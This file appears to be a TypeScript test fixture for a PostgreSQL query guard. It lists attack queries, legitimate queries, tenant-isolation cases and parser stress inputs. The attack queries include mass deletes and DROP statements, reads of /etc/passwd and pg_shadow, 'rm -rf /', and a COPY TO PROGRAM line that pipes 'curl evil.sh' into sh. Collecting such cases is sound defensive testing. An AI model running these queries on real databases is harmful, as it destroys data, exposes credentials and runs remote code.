const ids101 = Array.from({ length: 101 }, (_, i) => `$${i + 1}`).join(', ');

export const ATTACKS: Record<string, string[]> = {
  unbounded_mutation: [
    'DELETE FROM users',
    'UPDATE users SET role = $1',
    'DELETE FROM users WHERE 1 = 1',
    'DELETE FROM users WHERE id = id',
    'DELETE FROM users WHERE id = 1 OR 1 = 1',
    'DELETE FROM users WHERE id = 1 OR TRUE',
    'DELETE FROM users WHERE id = 1 AND 1 = 1',
    "DELETE FROM users WHERE name LIKE '%'",
    'DELETE FROM users WHERE id > 0',
    'DELETE FROM users WHERE id IS NOT NULL',
    'DELETE FROM users WHERE NOT (id = 1)',
    "DELETE FROM users WHERE name = 'bob'",
    'DELETE FROM users WHERE id = ANY(SELECT id FROM users)',
    'UPDATE users SET a = 1 FROM other WHERE users.id = other.id',
    'DELETE FROM users USING other WHERE users.id = other.id',
    `DELETE FROM users WHERE id IN (${ids101})`,
    'DELETE FROM users WHERE id IN ()',
  ],
  ddl_and_admin: [
    'DROP TABLE users', 'DROP SCHEMA public CASCADE', 'TRUNCATE users',
    'ALTER TABLE users DROP COLUMN email', 'CREATE TABLE x (id int)', 'CREATE EXTENSION dblink',
    'GRANT ALL ON users TO public', 'REVOKE ALL ON users FROM app',
    'DO $$ BEGIN DELETE FROM users; END $$',
    "COPY users TO PROGRAM 'curl evil.sh | sh'", 'COPY users FROM STDIN',
    'VACUUM FULL', 'CALL wipe()', 'EXECUTE stmt', 'PREPARE s AS DELETE FROM users',
    'EXPLAIN ANALYZE DELETE FROM users', 'SET ROLE postgres', 'SET search_path = evil',
    'RESET ALL', 'SHOW ALL', 'BEGIN', 'COMMIT', 'LISTEN c', "NOTIFY c, 'x'", 'LOCK TABLE users',
    'MERGE INTO users u USING s ON u.id = s.id WHEN MATCHED THEN DELETE',
    'REFRESH MATERIALIZED VIEW v', 'DISCARD ALL', 'CHECKPOINT',
  ],
  stacked: [
    'SELECT 1; DROP TABLE users', 'SELECT 1;DELETE FROM users', 'SELECT 1 /* c */; DELETE FROM users',
    'SELECT 1 -- x\n; DROP TABLE users', 'DELETE FROM users WHERE id = 1; DELETE FROM users',
    'SELECT 1;;; DROP TABLE users', 'SELECT 1; SELECT 2',
  ],
  cte_writes: [
    'WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d',
    'WITH d AS (UPDATE users SET a = 1 RETURNING *) SELECT * FROM d',
    'WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT n FROM r) DELETE FROM users',
  ],
  side_effects: [
    'SELECT pg_sleep(10)', 'SELECT PG_SLEEP(10)', 'SELECT "pg_sleep"(10)', 'SELECT pg_catalog.pg_sleep(10)',
    "SELECT pg_read_file('/etc/passwd')", 'SELECT pg_terminate_backend(1)', "SELECT pg_ls_dir('.')",
    "SELECT dblink('host=x', 'select 1')", "SELECT lo_import('/etc/passwd')",
    "SELECT query_to_xml('select 1', true, true, '')", "SELECT set_config('role', 'admin', false)",
    "SELECT current_setting('is_superuser')", "SELECT nextval('s')", "SELECT setval('s', 1)",
    'SELECT generate_series(1, 1000000000)', "SELECT repeat('a', 1000000000)", 'SELECT version()',
    'SELECT public.evil()', 'SELECT evil_fn()', 'SELECT * FROM pg_catalog.pg_user', 'SELECT * FROM pg_shadow',
    'SELECT * FROM information_schema.tables', 'SELECT * INTO newt FROM users',
    'SELECT * FROM users FOR UPDATE', 'SELECT * FROM users FOR NO KEY UPDATE', 'SELECT * FROM users FOR SHARE',
  ],
  syntax_tricks: [
    "SELECT 'abc", 'SELECT /* never closed', 'SELECT $a$ never closed', 'SELECT 1\u0000; DROP TABLE users',
    "SELECT 'a\\'; DROP TABLE users; --'", 'SELECT 1\u0007', 'SELECT U&"d\\0072op" FROM t',
    'SELECT 1 ) ; DROP TABLE users', 'SELECT (1; DROP TABLE users', 'SELECT `1`', 'SELECT {1}',
    '', '   ', ';;;', '-- just a comment', '/* only */', 'SELECT 1 \\gexec', 'SELECT 1 \\! rm -rf /',
  ],
  resource_limits: [
    `SELECT ${'('.repeat(30)}1${')'.repeat(30)}`,
    'SELECT ' + Array(1500).fill('1').join(','),
    'SELECT ' + 'a'.repeat(9000),
    'SELECT 1' + ' '.repeat(10_000),
  ],
};

export const ATTACK_LIST = Object.entries(ATTACKS).flatMap(([cat, qs]) => qs.map((sql) => ({ cat, sql })));

export const LEGIT: string[] = [
  'SELECT 1',
  'SELECT 1;',
  'SELECT id, email FROM users WHERE id = 42',
  'SELECT count(*) FROM orders WHERE total > 100',
  'SELECT lower(email) FROM users WHERE id = $1',
  'SELECT coalesce(nickname, name) FROM users WHERE id = $1',
  'SELECT o.id FROM orders o JOIN customers c ON c.id = o.customer_id WHERE o.id = $1',
  'SELECT a.id, b.id FROM a LEFT JOIN b ON a.id = b.a_id',
  'WITH recent AS (SELECT id FROM orders WHERE total > 100) SELECT count(*) FROM recent',
  "SELECT date_trunc('day', created_at) AS d, count(*) FROM orders GROUP BY 1",
  'SELECT * FROM users ORDER BY created_at DESC LIMIT 20',
  "SELECT * FROM users WHERE email = 'a@b.com'",
  "SELECT * FROM events WHERE created_at > now() - interval '1 day'",
  'SELECT id FROM users WHERE id = ANY($1)',
  "SELECT jsonb_build_object('k', id) FROM users WHERE id = $1",
  'SELECT id FROM users UNION SELECT id FROM admins',
  "SELECT 'it''s fine'",
  "SELECT E'tab\\there'",
  'SELECT 1 -- trailing comment',
  'SELECT /* inline */ 1',
  'SELECT "id" FROM "users" WHERE "id" = $1',
  'INSERT INTO notes (title, body) VALUES ($1, $2)',
  'INSERT INTO notes (title) VALUES ($1) ON CONFLICT DO NOTHING',
  'UPDATE orders SET status = $1 WHERE id = $2',
  'UPDATE users SET name = $1 WHERE id IN ($2, $3)',
  'DELETE FROM sessions WHERE id = $1',
  'DELETE FROM sessions WHERE id = $1 AND user_id = $2',
];

// Executable documentation of limitations. These are tested with it.fails:
// they stay green while the limitation exists, and turn red when you fix it (then flip them).
export const KNOWN_FALSE_POSITIVES = [
  'SELECT lo_balance FROM accounts WHERE id = $1', // "lo_" prefix block
    'SELECT $$hello$$',  // pgsql-ast-parser cannot parse dollar-quoted strings (fails closed)
  'DELETE FROM sessions WHERE token = $1',          // key columns are hardcoded
  'UPDATE users SET name = $1 WHERE email = $2',
];

export const TENANT_OPTS = { requireTenantFilter: true, expectedTenantId: 'acme' };
export const TENANT_BLOCK = [
  'SELECT * FROM orders',
  'SELECT * FROM orders WHERE id = 1',
  "SELECT * FROM orders WHERE tenant_id = 'other'",
  "SELECT * FROM orders WHERE tenant_id <> 'acme'",
  "SELECT * FROM orders WHERE tenant_id = 'acme' OR 1 = 1",
  "SELECT * FROM orders WHERE tenant_id = 'acme' UNION SELECT * FROM secrets",
];
export const TENANT_ALLOW = [
  "SELECT * FROM orders WHERE tenant_id = 'acme'",
  'SELECT * FROM orders WHERE tenant_id = $1',
  "SELECT * FROM orders WHERE tenant_id = 'acme' AND id = $1",
];
export const TENANT_KNOWN_GAPS = [
  "SELECT * FROM orders o JOIN secrets s ON true WHERE o.tenant_id = 'acme'",
  "SELECT * FROM orders WHERE tenant_id = 'acme' AND id IN (SELECT id FROM secrets)",
];

const nested = (() => { let q = 'SELECT 1'; for (let i = 0; i < 20; i++) q = `SELECT * FROM (${q}) t${i}`; return q; })();
export const WORST_SHAPES: Record<string, string> = {
    longString: "SELECT '" + 'a'.repeat(8000) + "'",
  longQuotedIdent: 'SELECT "' + 'a'.repeat(8000) + '"',
  longNumber: 'SELECT ' + '9'.repeat(8000),
  spacedPlus: 'SELECT ' + '+ '.repeat(400) + '1',
  notChain: 'SELECT ' + 'NOT '.repeat(300) + 'true',
  bigArray: 'SELECT ARRAY[' + '1,'.repeat(500) + '1]',
  bigInList: 'SELECT * FROM t WHERE id IN (' + Array.from({ length: 500 }, (_, i) => i).join(',') + ')',
  deepParens: 'SELECT ' + '('.repeat(24) + '1' + ')'.repeat(24),
  deepSubselect: nested,
  longOr: 'SELECT * FROM t WHERE ' + Array.from({ length: 200 }, (_, i) => `a${i} = ${i}`).join(' OR '),
  longAnd: 'SELECT * FROM t WHERE ' + Array.from({ length: 200 }, (_, i) => `a${i} = ${i}`).join(' AND '),
  caseChain: 'SELECT ' + 'CASE WHEN a = 1 THEN 1 ELSE '.repeat(120) + '0' + ' END'.repeat(120),
  manyJoins: 'SELECT 1 FROM t0 ' + Array.from({ length: 60 }, (_, i) => `JOIN t${i + 1} ON t${i}.id = t${i + 1}.id`).join(' '),
  manyUnions: Array(100).fill('SELECT 1').join(' UNION '),
  castChain: 'SELECT 1' + '::int'.repeat(400),
  unterminatedString: "SELECT '" + 'a'.repeat(8000),
  commentBomb: '/*'.repeat(4000),
  dollarTags: '$a$'.repeat(2600),
  quoteFlood: '"'.repeat(8000),
  operatorFlood: 'SELECT ' + '+'.repeat(8000),
  longIdentifier: 'SELECT ' + 'a'.repeat(8000),
  hugeInput: 'SELECT 1' + ' '.repeat(5_000_000),
};